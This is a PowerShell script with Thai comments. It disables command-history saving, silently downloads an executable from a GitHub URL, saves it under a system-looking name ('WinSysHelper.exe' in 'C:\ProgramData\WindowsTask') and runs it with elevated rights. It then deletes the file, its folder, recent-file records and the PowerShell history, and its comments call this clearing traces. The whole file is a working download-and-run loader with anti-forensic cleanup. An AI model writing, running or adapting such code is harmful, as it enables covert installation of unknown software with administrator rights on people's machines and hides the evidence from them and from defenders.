# 1. พยายามปิดการบันทึกประวัติ (ถ้าทำไม่ได้ให้ข้ามไปเลย ไม่ต้องขึ้นตัวแดง)
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue } catch {}

# 2. ตั้งค่าพื้นฐานแบบเงียบกริบ
$ProgressPreference = 'SilentlyContinue'
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"

# ใช้ Temp แทนถ้า ProgramData เข้าไม่ได้ เพื่อความชัวร์ว่าจะไม่แดง
$folder = "C:\ProgramData\WindowsTask"
try {
    if (-not (Test-Path $folder)) { 
        New-Item -Path $folder -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null 
    }
    $output = "$folder\WinSysHelper.exe"
} catch {
    $output = "$env:TEMP\WinSysHelper.exe"
}

# 3. ดาวน์โหลดและรัน
try {
    Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction SilentlyContinue
    $process = Start-Process -FilePath $output -Verb RunAs -PassThru -ErrorAction SilentlyContinue
    if ($process) { $process | Wait-Process }
} catch {
    # ถ้า Error จริงๆ ให้ลองโหลดไปที่ Temp แทนเป็นแผนสำรอง
    $output = "$env:TEMP\BASX_Backup.exe"
    Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction SilentlyContinue
    Start-Process -FilePath $output -Verb RunAs -Wait -ErrorAction SilentlyContinue
}

# 4. ล้างร่องรอย (ใส่ SilentlyContinue ทุกจุดเพื่อไม่ให้ตัวแดงขึ้น)
Start-Sleep -Seconds 2
Remove-Item -Path $output -Force -ErrorAction SilentlyContinue
Remove-Item -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\WinSysHelper*" -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations" | Remove-Item -Force -ErrorAction SilentlyContinue
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue

# 5. ปิดตัวเอง
exit
